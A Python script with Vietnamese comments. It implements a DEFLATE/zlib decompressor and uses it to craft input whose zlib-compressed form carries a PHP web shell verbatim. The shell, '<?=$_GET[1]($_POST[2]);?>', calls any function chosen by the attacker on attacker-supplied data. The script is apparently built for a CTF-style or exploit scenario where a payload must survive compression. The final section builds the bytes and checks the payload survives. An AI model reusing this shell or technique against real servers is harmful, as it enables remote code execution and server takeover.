class BitReader:
    def __init__(self, mem):
        self.mem = mem
        self.pos = 0
        self.b = 0
        self.numbits = 0

    def read_byte(self):
        self.numbits = 0 # discard unread bits
        b = self.mem[self.pos]
        self.pos += 1
        return b

    def read_bit(self):
        if self.numbits <= 0:
            self.b = self.read_byte()
            self.numbits = 8
        self.numbits -= 1
        # shift bit out of byte
        bit = self.b & 1
        self.b >>= 1
        return bit

    def read_bits(self, n):
        o = 0
        for i in range(n):
            o |= self.read_bit() << i
        return o

    def read_bytes(self, n):
        # read bytes as an integer in little-endian
        o = 0
        for i in range(n):
            o |= self.read_byte() << (8 * i)
        return o

def decompress(input):
    r = BitReader(input)
    CMF = r.read_byte()
    CM = CMF & 15 # Compression method
    if CM != 8: # only CM=8 is supported
        raise Exception('invalid CM')
    CINFO = (CMF >> 4) & 15 # Compression info
    if CINFO > 7:
        raise Exception('invalid CINFO')
    FLG = r.read_byte()
    if (CMF * 256 + FLG) % 31 != 0:
        raise Exception('CMF+FLG checksum failed')
    FDICT = (FLG >> 5) & 1 # preset dictionary?
    if FDICT:
        raise Exception('preset dictionary not supported')
    out = inflate(r) # decompress DEFLATE data
    
    ADLER32 = r.read_bytes(4) # Adler-32 checksum (for this exercise, we ignore it)
    return out

def inflate(r):
    BFINAL = 0
    out = []
    while not BFINAL:
        BFINAL = r.read_bit()
        BTYPE = r.read_bits(2)
        if (BTYPE != 1):
            print("Constraint may be violated")
        if BTYPE == 0:
            inflate_block_no_compression(r, out)
        elif BTYPE == 1:
            inflate_block_fixed(r, out)
        elif BTYPE == 2:
            inflate_block_dynamic(r, out)
        else:
            raise Exception('invalid BTYPE')
    return bytes(out)

# [Be fun to skip me]
def inflate_block_no_compression(r, o):
    LEN = r.read_bytes(2)
    NLEN = r.read_bytes(2)
    o.extend(r.read_byte() for _ in range(LEN))

def code_to_bytes(code, n):
    # Encodes a code that is `n` bits long into bytes that is conformant with DEFLATE spec
    out = [0]
    numbits = 0
    for i in range(n-1, -1, -1):
        if numbits >= 8:
            out.append(0)
            numbits = 0
        out[-1] |= (1 if code & (1 << i) else 0) << numbits
        numbits += 1
    return bytes(out)

class Node:
    def __init__(self):
        self.symbol = ''
        self.left = None
        self.right = None

class HuffmanTree:
    def __init__(self):
        self.root = Node()
        self.root.symbol = ''

    def insert(self, codeword, n, symbol):
        # Insert an entry into the tree mapping `codeword` of len `n` to `symbol`
        node = self.root
        for i in range(n-1, -1, -1):
            b = codeword & (1 << i)
            if b:
                next_node = node.right
                if next_node is None:
                    node.right = Node()
                    next_node = node.right
            else:
                next_node = node.left
                if next_node is None:
                    node.left = Node()
                    next_node = node.left
            node = next_node
        node.symbol = symbol

def decode_symbol(r, t):
    "Decodes one symbol from bitstream `r` using HuffmanTree `t`"
    node = t.root
    while node.left or node.right:
        b = r.read_bit()
        node = node.right if b else node.left
    
    return node.symbol

# [Be fun to skip me]
LengthExtraBits = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3,
        3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
LengthBase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43,
        51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
DistanceExtraBits = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7,
        8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
DistanceBase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257,
        385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385,
        24577]

def inflate_block_data(r, literal_length_tree, distance_tree, out):
    while True:
        sym = decode_symbol(r, literal_length_tree)
        # print(sym)
        if sym <= 255: # Literal byte
            out.append(sym)
        elif sym == 256: # End of block
            return
        else: # <length, backward distance> pair
            print("Constraint may be violated")
            sym -= 257
            length = r.read_bits(LengthExtraBits[sym]) + LengthBase[sym]
            dist_sym = decode_symbol(r, distance_tree)
            dist = r.read_bits(DistanceExtraBits[dist_sym]) + DistanceBase[dist_sym]
            for _ in range(length):
                out.append(out[-dist])

def bl_list_to_tree(bl, alphabet):
    MAX_BITS = max(bl)
    bl_count = [sum(1 for x in bl if x == y and y != 0) for y in range(MAX_BITS+1)]
    next_code = [0, 0]
    for bits in range(2, MAX_BITS+1):
        next_code.append((next_code[bits-1] + bl_count[bits-1]) << 1)
    t = HuffmanTree()
    for c, bitlen in zip(alphabet, bl):
        if bitlen != 0:
            t.insert(next_code[bitlen], bitlen, c)
            next_code[bitlen] += 1
    return t

CodeLengthCodesOrder = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

# [Be fun to skip me]
def decode_trees(r):
    # The number of literal/length codes
    HLIT = r.read_bits(5) + 257

    # The number of distance codes
    HDIST = r.read_bits(5) + 1

    # The number of code length codes
    HCLEN = r.read_bits(4) + 4

    # Read code lengths for the code length alphabet
    code_length_tree_bl = [0 for _ in range(19)]
    for i in range(HCLEN):
        code_length_tree_bl[CodeLengthCodesOrder[i]] = r.read_bits(3)

    # Construct code length tree
    code_length_tree = bl_list_to_tree(code_length_tree_bl, range(19))

    # Read literal/length + distance code length list
    bl = []
    while len(bl) < HLIT + HDIST:
        sym = decode_symbol(r, code_length_tree)
        if 0 <= sym <= 15: # literal value
            bl.append(sym)
        elif sym == 16:
            # copy the previous code length 3..6 times.
            # the next 2 bits indicate repeat length ( 0 = 3, ..., 3 = 6 )
            prev_code_length = bl[-1]
            repeat_length = r.read_bits(2) + 3
            bl.extend(prev_code_length for _ in range(repeat_length))
        elif sym == 17:
            # repeat code length 0 for 3..10 times. (3 bits of length)
            repeat_length = r.read_bits(3) + 3
            bl.extend(0 for _ in range(repeat_length))
        elif sym == 18:
            # repeat code length 0 for 11..138 times. (7 bits of length)
            repeat_length = r.read_bits(7) + 11
            bl.extend(0 for _ in range(repeat_length))
        else:
            raise Exception('invalid symbol')

    # Construct trees
    literal_length_tree = bl_list_to_tree(bl[:HLIT], range(286))
    distance_tree = bl_list_to_tree(bl[HLIT:], range(30))
    return literal_length_tree, distance_tree

# [Be fun to skip me]
def inflate_block_dynamic(r, o):
    literal_length_tree, distance_tree = decode_trees(r)
    inflate_block_data(r, literal_length_tree, distance_tree, o)

def inflate_block_fixed(r, o):
    bl = ([8 for _ in range(144)] + [9 for _ in range(144, 256)] +
        [7 for _ in range(256, 280)] + [8 for _ in range(280, 288)])
    literal_length_tree = bl_list_to_tree(bl, range(286))
    
    bl = [5 for _ in range(30)]
    distance_tree = bl_list_to_tree(bl, range(30))

    inflate_block_data(r, literal_length_tree, distance_tree, o)

# Điều kiện để code đúng, nếu không thì sẽ phải tự sửa lại tùy payload 😿
# 1. Không dùng quá nhiều loại ký tự khác nhau trong payload.
# 2. Dùng payload càng ngắn càng tốt.
# 3. Mỗi substring độ dài 3 sau khi decompress() không xuất hiện quá 1 lần (Để đảm bảo BTYPE luôn bằng 1).
# 4. Nên để terminate_symbol như vậy.

# Ghi chú cho sau này:
# - Các phần được implement nhưng lại không dùng mà được để lại đề phòng sau này sẽ được comment là "# [Be fun to skip me]"
# - Điều kiện 1 được dùng để đảm bảo BTYPE không thể bằng 0.
# - Điều kiện 2 được dùng để đảm bảo BTYPE không thể bằng 2.
# - Điều kiện 3 được dùng để đảm bảo thuật toán LZ77 được dùng khi compress() không có tác dụng, do đó lúc decompress() cũng không có tác dụng.
# - 27/12/2022: chỉ có 3 loại BTYPE 0, 1 và 2. Mình cố gắng để BTYPE = 1, 
#       + là một giá trị cho phép hiệu quả về cả độ phức tạp và độ dài của payload và output.
#       + mình cố gắng để BTYPE = 1 nhưng đoạn implement decompress() thì có cả code xử lý khi BTYPE = 0 hay 2 dùng để đề phòng cho sau này.
#       + tương tự phần xử lý LZ77 ở trên cũng không có tác dụng nhưng sẽ được mình để lại.

metadata_and_something = b'x\x9cc^' # Chủ yếu là metadata để compress
payload = b'<?=$_GET[1]($_POST[2]);?>'
terminate_symbol = b'\x00\x00' # Đảm bảo luôn có 7 bit 0 sau payload
checksum = b'n\xcf\x07;' # checksum phải có chính xác 4 byte, còn giá trị để thế nào cũng được vì implement ở trên bỏ qua checksum nhưng vẫn kiểm tra format nên cần đủ 4 byte
t = decompress(metadata_and_something + payload + terminate_symbol + checksum)
print(t)

import zlib
print("\nDouble check")
com = zlib.compress(t)
if (payload in com):
    print("Yeah 🙂")
else:
    print("Take a rest 🤕")
